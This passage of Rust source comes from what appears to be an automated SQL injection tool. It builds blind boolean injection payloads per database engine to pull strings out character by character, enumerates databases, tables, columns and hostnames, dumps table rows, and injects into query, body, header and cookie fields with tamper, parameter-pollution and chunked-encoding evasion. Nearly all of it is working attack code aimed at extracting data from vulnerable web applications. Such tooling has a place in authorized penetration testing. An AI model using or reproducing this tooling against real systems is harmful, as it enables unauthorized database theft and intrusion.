            warn!("length inference failed, falling back to 16");
            inferred_len = 16; // fallback with warning
        }
        info!(len=%inferred_len, "inferred version length");

        // Now extract string char by char via binary search oracle
        let engine = crate::extraction::engine::ExtractionEngine::new(
            crate::extraction::engine::ExtractionConfig::default(),
        );
        let dbms_for_closure = dbms_kind;
        let version_query_owned = version_query.to_owned();
        let baseline_body2 = baseline_body.clone();
        let baseline_mean2 = baseline_mean;
        let client_for_oracle = client_clone.clone();
        let state_for_oracle = state_clone.clone();
        let cancel_for_oracle = cancel_clone.clone();
        let target_for_oracle = target_clone2.clone();
        let param_for_oracle = first_param_clone.clone();
        let marker_for_oracle = marker_set_clone.clone();
        let raw_for_oracle = raw_request.as_ref().clone();

        let target_str_for_oracle = target_str_clone.clone();
        let tampers_for_oracle = effective_tampers.to_vec();
        let popts_for_oracle = self.config.payload_opts.clone();
        let oracle = move |pos: usize, mid: u8| {
            let client = client_for_oracle.clone();
            let state = state_for_oracle.clone();
            let cancel = cancel_for_oracle.clone();
            let target = target_for_oracle.clone();
            let param = param_for_oracle.clone();
            let marker_set = marker_for_oracle.clone();
            let raw = raw_for_oracle.clone();
            let baseline_body = baseline_body2.clone();
            let version_query = version_query_owned.clone();
            let dbms_kind = dbms_for_closure;
            let target_str = target_str_for_oracle.clone();
            let tampers = tampers_for_oracle.clone();
            let popts = popts_for_oracle.clone();
            let opts = effective_opts;
            async move {
                // build ASCII(SUBSTRING) >= mid payload
                #[allow(clippy::match_same_arms)]
                let base = match dbms_kind {
                    crate::dbms::DbmsKind::MySql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Postgres => format!(
                        "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::MsSql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Oracle => format!(
                        "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Unknown => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                };
                let payload = build_final_payload(&base, &tampers, &popts);
                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
                let spec = build_injection_spec_with_raw(
                    &target,
                    &target_str,
                    &param,
                    &payload,
                    &marker_set,
                    raw.as_ref(),
                    opts,
                    &popts,
                );
                let start = Instant::now();
                let resp = client.send_with_retry(spec, &cancel).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state.write().await.increment_requests();
                let body = match resp {
                    Ok(r) => r.text().await.unwrap_or_default(),
                    Err(_) => String::new(),
                };
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean2,
                    ms,
                    100.0,
                );
                // similar => true (>= mid)
                Ok::<bool, InjektError>(diff.confidence < 0.4)
            }
        };
        let extracted = engine.extract(inferred_len, oracle).await?;
        let exposed = {
            use secrecy::ExposeSecret;
            extracted.expose_secret().to_owned()
        };
        info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
        // scrubbed hash logged, raw stored as SecretString zeroized after report
        self.state.write().await.push_extracted(extracted);
        Ok(())
    }

    /// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
    /// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
    /// same injection point as extraction.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_enumeration(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        // Reuse extraction context
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        let dbms_kind = {
            let snap = self.state.read().await.findings().to_vec();
            crate::dbms::fingerprint::guess_from_findings(&snap)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };

        let detector = crate::dbms::fingerprint::get_detector(dbms_kind);

        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client = self.client.clone();
        let state = Arc::clone(&self.state);
        let cancel = self.cancel.clone();
        let target_str = target_str.to_owned();
        let marker_set = marker_set.clone();
        let raw_request_for_enum = raw_request.as_ref().clone();

        let start = self.config.start.unwrap_or(0);
        let stop = self.config.stop.unwrap_or(100);

        if self.config.dbs {
            let query = detector.list_databases_query();
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "databases".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_db = self.config.db.clone().unwrap_or_default();
        if self.config.tables && !target_db.is_empty() {
            let query = detector.list_tables_query(&target_db);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "tables".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_table = self.config.table.clone().unwrap_or_default();
        if self.config.columns && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.list_columns_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "columns".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.dump && !target_db.is_empty() && !target_table.is_empty() {
            let columns: Vec<String> = self
                .config
                .column
                .clone()
                .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
                .unwrap_or_default();
            let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "dump".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.count && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.count_rows_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "count".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        for (flag, query, label) in [
            (self.config.banner, detector.banner_query(), "banner"),
            (
                self.config.current_user,
                detector.current_user_query(),
                "current_user",
            ),
            (
                self.config.current_db,
                detector.current_db_query(),
                "current_db",
            ),
            (self.config.hostname, detector.hostname_query(), "hostname"),
        ] {
            if !flag {
                continue;
            }
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                label.to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.payload_opts,
                &self.config.matcher,
                &self.config.ignore_codes,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }
        Ok(())
    }

    #[allow(dead_code)]
    async fn test_boolean(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let payloads = boolean_payloads_for(None);
        let detector = BooleanDetector::new();
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            // craft urls with payloads
            let true_url = inject_param(target, param, &p.true_payload, &[], false);
            let false_url = inject_param(target, param, &p.false_payload, &[], false);

            let (true_body, true_ms) =
                fetch_body_and_time(&self.client, &true_url, &self.state).await;
            let (false_body, false_ms) =
                fetch_body_and_time(&self.client, &false_url, &self.state).await;

            let baseline_body = baseline.representative_body_str();
            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2}",
                    res.true_similarity, res.false_similarity
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    res.confidence,
                    evidence,
                );
                finding.dbms = None;
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_error(&self, target: &TargetUrl, param: &TargetParameter) {
        let detector = ErrorDetector::new();
        let payloads = crate::techniques::error::payloads::error_payloads_for(None);
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            let url = inject_param(target, param, &p.payload, &[], false);
            let (body, _ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
            let r = detector.evaluate(&body);
            if r.is_vulnerable {
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    r.confidence,
                    format!("error pattern {:?}", r.matched_pattern),
                );
                finding.dbms = Some(p.dbms.clone());
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_time(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
        let payload = time_payload_for(None, 3);
        let url = inject_param(target, param, &payload.payload, &[], false);
        let (_body, ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
        #[allow(clippy::cast_precision_loss)]
        let r = detector.evaluate(ms, payload.sleep_secs as f64);
        if r.is_vulnerable {
            let finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Time,
                r.confidence,
                format!(
                    "time delay {:.0}ms > threshold {:.0}ms",
                    r.measured_ms,
                    detector.threshold()
                ),
            );
            self.state.write().await.push_finding(finding);
        }
    }
}

fn inject_param(
    target: &TargetUrl,
    param: &TargetParameter,
    payload: &str,
    safe: &[char],
    skip_urlencode: bool,
) -> String {
    // naive: replace query param value
    let mut url = target.inner().clone();
    let mut pairs: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    let mut found = false;
    for (k, v) in &mut pairs {
        if k == &param.name {
            payload.clone_into(v);
            found = true;
        }
    }
    if !found {
        pairs.push((param.name.clone(), payload.to_owned()));
    }
    // Default path (no --safe-chars/--skip-urlencode): standard encoding,
    // byte-identical to the historical behaviour.
    if safe.is_empty() && !skip_urlencode {
        url.query_pairs_mut().clear();
        for (k, v) in pairs {
            url.query_pairs_mut().append_pair(&k, &v);
        }
        return url.to_string();
    }
    // Custom encoding: keys stay standard, values honour safe/skip.
    let query = pairs
        .iter()
        .map(|(k, v)| {
            let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
            format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
        })
        .collect::<Vec<_>>()
        .join("&");
    url.set_query(Some(&query));
    url.to_string()
}

#[allow(clippy::collapsible_if)]
fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -> String {
    let mut s = target_str.to_owned();
    if marker_set.asterisk {
        if s.contains('*') {
            // Replace only first occurrence to avoid over-broad replacement
            if let Some(pos) = s.find('*') {
                s.replace_range(pos..=pos, payload);
                return s;
            }
        } else {
            // Handle encoded asterisk %2A (case-insensitive) when URL is percent-encoded
            let lower = s.to_ascii_lowercase();
            if let Some(pos) = lower.find("%2a") {
                s.replace_range(pos..pos + 3, payload);
                return s;
            }
        }
    }
    if marker_set.section {
        // §payload§ -> replace inner
        if let Some(start) = s.find('§')
            && let Some(end) = s[start + '§'.len_utf8()..].find('§')
        {
            let sec_end = start + '§'.len_utf8() + end + '§'.len_utf8();
            s.replace_range(start..sec_end, payload);
            return s;
        }
    }
    if marker_set.double_brace && s.contains("{{") && s.contains("}}") {
        if let Some(start) = s.find("{{")
            && let Some(end) = s[start..].find("}}")
        {
            let brace_end = start + end + "}}".len();
            s.replace_range(start..brace_end, payload);
            return s;
        }
    }
    // fallback: append as query
    if s.contains('?') {
        format!("{s}&injekt={payload}")
    } else {
        format!("{s}?injekt={payload}")
    }
}

#[allow(dead_code)]
fn inject_param_or_marker(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> String {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        inject_with_marker(target_str, payload, marker_set)
    } else {
        inject_param(target, param, payload, &[], false)
    }
}

#[allow(clippy::too_many_lines)]
fn inject_body_param(
    raw: Option<&crate::target::raw_request::RawRequest>,
    param: &TargetParameter,
    payload: &str,
    hpp: bool,
    safe: &[char],
    skip_urlencode: bool,
) -> (Method, String, http::HeaderMap) {
    let method = raw
        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
        .unwrap_or(Method::POST);
    let existing_body = raw.and_then(|r| r.body.as_deref());
    // JSON bodies (`--data '{"a":1}'`): replace the key inside the object so
    // blind payloads flow as valid JSON instead of urlencoded noise.
    if let Some(body) = existing_body {
        let trimmed = body.trim();
        if trimmed.starts_with('{')
            && trimmed.ends_with('}')
            && let Ok(serde_json::Value::Object(mut obj)) =
                serde_json::from_str::<serde_json::Value>(trimmed)
        {
            obj.insert(
                param.name.clone(),
                serde_json::Value::String(payload.to_owned()),
            );
            let json_body =
                serde_json::to_string(&serde_json::Value::Object(obj)).unwrap_or_else(|_| {
                    format!("{{\"{}\":\"{payload}\"}}", param.name.replace('"', "\\\""))
                });
            let mut headers = http::HeaderMap::new();
            headers.insert(
                http::header::CONTENT_TYPE,
                http::HeaderValue::from_static("application/json"),
            );
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("content-type")
                        || k.eq_ignore_ascii_case("content-length")
                    {
                        continue;
                    }
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            return (method, json_body, headers);
        }
    }
    if hpp {
        // HPP: keep original fields, append param=payload as duplicate.
        let body_str = hpp_body_str(existing_body, &param.name, payload);
        let mut headers = http::HeaderMap::new();
        headers.insert(
            http::header::CONTENT_TYPE,
            http::HeaderValue::from_static("application/x-www-form-urlencoded"),
        );
        if let Some(r) = raw {
            for (k, v) in &r.headers {
                if k.eq_ignore_ascii_case("content-type")
                    || k.eq_ignore_ascii_case("content-length")
                {
                    continue;
                }
                if let (Ok(name), Ok(val)) = (
                    http::HeaderName::from_bytes(k.as_bytes()),
                    http::HeaderValue::from_str(v),
                ) {
                    headers.insert(name, val);
                }
            }
        }
        return (method, body_str, headers);
    }
    let body_str = if let Some(body) = existing_body {
        // Preserve other body fields, replace only target param
        let mut pairs: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect();
        let mut found = false;
        for (k, v) in &mut pairs {
            if k == &param.name {
                payload.clone_into(v);
                found = true;
            }
        }
        if !found {
            pairs.push((param.name.clone(), payload.to_owned()));
        }
        // Default path: standard encoding. Custom path (--safe-chars/
        // --skip-urlencode): keys stay standard, values honour safe/skip.
        if safe.is_empty() && !skip_urlencode {
            url::form_urlencoded::Serializer::new(String::new())
                .extend_pairs(pairs)
                .finish()
        } else {
            pairs
                .iter()
                .map(|(k, v)| {
                    let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
                    format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
                })
                .collect::<Vec<_>>()
                .join("&")
        }
    } else {
        format!(
            "{}={}",
            param.name,
            url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
        )
    };
    let mut headers = http::HeaderMap::new();
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    // Preserve other headers from raw request (e.g., Host, User-Agent)
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    (method, body_str, headers)
}

fn request_spec_from_raw(target: &TargetUrl, raw: &RawRequest) -> RequestSpec {
    let method = Method::from_bytes(raw.method.as_bytes()).unwrap_or(Method::GET);
    let mut headers = http::HeaderMap::new();
    for (k, v) in &raw.headers {
        if k.eq_ignore_ascii_case("content-length") || k.eq_ignore_ascii_case("host") {
            continue;
        }
        if let (Ok(name), Ok(value)) = (
            http::HeaderName::from_bytes(k.as_bytes()),
            http::HeaderValue::from_str(v),
        ) {
            headers.insert(name, value);
        }
    }
    let mut spec = RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers);
    if let Some(body) = &raw.body {
        spec = spec.with_body(body.as_bytes().to_vec());
    }
    spec
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
fn build_injection_spec_with_raw(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&crate::target::raw_request::RawRequest>,
    opts: ProbeOpts,
    popts: &PayloadOpts,
) -> RequestSpec {
    // Custom value encoding (--safe-chars/--skip-urlencode); collected once
    // per injection (requests dominate the cost).
    let safe: Vec<char> = popts.safe_chars.chars().collect();
    let skip = popts.skip_urlencode;
    if marker_set.has_any() && param.name.starts_with("marker_") {
        let url = inject_with_marker(target_str, payload, marker_set);
        // Preserve method from raw request if available
        let method = raw
            .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
            .unwrap_or(Method::GET);
        return RequestSpec::new(method, url);
    }
    match &param.location {
        ParameterLocation::Query => {
            let url = if opts.hpp {
                hpp_query_url(target.inner(), &param.name, payload)
            } else {
                inject_param(target, param, payload, &safe, skip)
            };
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, url)
        }
        ParameterLocation::Body => {
            let (method, body_str, mut headers) =
                inject_body_param(raw, param, payload, opts.hpp, &safe, skip);
            if should_apply_chunked(true, opts.chunked) {
                headers.remove(http::header::CONTENT_LENGTH);
                headers.insert(
                    http::header::TRANSFER_ENCODING,
                    http::HeaderValue::from_static("chunked"),
                );
            }
            RequestSpec::new(method, target.as_str().to_owned())
                .with_headers(headers)
                .with_body(body_str.into_bytes())
        }
        ParameterLocation::Header(h) => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers from raw request
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(h.as_bytes()),
                http::HeaderValue::from_str(payload),
            ) {
                headers.insert(name, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
        ParameterLocation::Cookie => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers, but rebuild Cookie header to preserve other cookies
            let mut cookies: Vec<(String, String)> = Vec::new();
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("cookie") {
                        for part in v.split(';') {
                            if let Some((ck, cv)) = part.trim().split_once('=') {
                                cookies.push((ck.trim().to_owned(), cv.trim().to_owned()));
                            }
                        }
                    } else if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            // Replace or insert target cookie
            let mut found = false;
            for (ck, cv) in &mut cookies {
                if ck == &param.name {
                    payload.clone_into(cv);
                    found = true;
                }
            }
            if !found {
                cookies.push((param.name.clone(), payload.to_owned()));
            }
            let cookie_val = cookies
                .into_iter()
                .map(|(k, v)| format!("{k}={v}"))
                .collect::<Vec<_>>()
                .join("; ");
            if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
                headers.insert(http::header::COOKIE, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn fetch_for_payload(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    opts: ProbeOpts,
    popts: &PayloadOpts,
) -> (String, f64, u16) {
    let spec = build_injection_spec_with_raw(
        target, target_str, param, payload, marker_set, raw, opts, popts,
    );
    let start = Instant::now();
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let status = r.status().as_u16();
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed, status)
        }
        Err(_) => (String::new(), elapsed, 0),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time(
    client: &HttpClient,
    url: &str,
    state: &Arc<RwLock<SessionState>>,
) -> (String, f64) {
    let start = Instant::now();
    let resp = client.get_with_retry(url.to_owned()).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time_spec(
    client: &HttpClient,
    url: String,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
) -> (String, f64) {
    let start = Instant::now();
    let spec = RequestSpec {
        method: Method::GET,
        url,
        headers: http::HeaderMap::new(),
        body: None,
    };
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(clippy::too_many_arguments)]
#[allow(clippy::similar_names)]
#[allow(clippy::too_many_lines)]
async fn test_boolean_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    let payloads = boolean_payloads_for(None);
    let detector = BooleanDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let true_payload = build_final_payload(&p.true_payload, trans, popts);
            let false_payload = build_final_payload(&p.false_payload, trans, popts);
            // Skip duplicate variants already tried for this base payload
            // (dedupe via string equality already handled by transformation sets, but
            // randomcase produces different strings per call — we still try each set once)
            let tamper_label = if trans.is_empty() {
                "none".to_owned()
            } else {
                trans
                    .iter()
                    .map(super::super::techniques::tamper::Tamper::name)
                    .collect::<Vec<_>>()
                    .join(",")
            };
            // 3 trials confirmation
            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
            let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
            let mut last_true = String::new();
            let mut last_false = String::new();
            let mut last_t_status: u16 = 0;
            #[allow(clippy::similar_names)]
            let mut last_f_status: u16 = 0;
            for _ in 0..3 {
                if cancel.is_cancelled() {
                    break;
                }
                let (true_raw, true_ms, true_status) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &true_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                )
                .await;
                let true_body = matcher.pre_process(&true_raw);
                let (false_raw, false_ms, false_status) = fetch_for_payload(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &false_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                )
                .await;
                let false_body = matcher.pre_process(&false_raw);
                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
                    trials.push(crate::detection::confirmation::Trial {
                        true_conf: 0.0,
                        false_conf: 1.0,
                    });
                    last_true = true_body;
                    last_false = false_body;
                    last_t_status = true_status;
                    last_f_status = false_status;
                    continue;
                }
                let res = detector.evaluate(
                    &baseline_body,
                    &true_body,
                    &false_body,
                    baseline.mean_ms,
                    true_ms,
                    false_ms,
                );
                trials.push(crate::detection::confirmation::Trial {
                    true_conf: res.true_similarity,
                    false_conf: res.false_similarity,
                });
                last_res = Some(res);
                last_true = true_body;
                last_false = false_body;
                last_t_status = true_status;
                last_f_status = false_status;
            }
            let conf = crate::detection::confirmation::confirm(&trials);
            if conf.confirmed {
                // Matcher veto gate: `Some(false)` rejects the candidate,
                // `None` abstains and lets the detector decide.
                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
                    == Some(false)
                {
                    continue;
                }
                let res = last_res.unwrap_or_else(|| {
                    detector.evaluate(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                });
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}",
                    res.true_similarity,
                    res.false_similarity,
                    conf.trials,
                    conf.false_positive_prob,
                    tamper_label,
                    opts.evidence_suffix(),
                    popts.evidence_suffix(),
                    matcher.evidence_suffix()
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    conf.score,
                    evidence,
                );
                finding.dbms = None;
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_error_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
) {
    let detector = ErrorDetector::new();
    let payloads = crate::techniques::error::payloads::error_payloads_for(None);
    let tamper_sets = tamper_transformation_sets(tampers);
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = build_final_payload(&p.payload, trans, popts);
            let (raw_body, _ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
                popts,
            )
            .await;
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
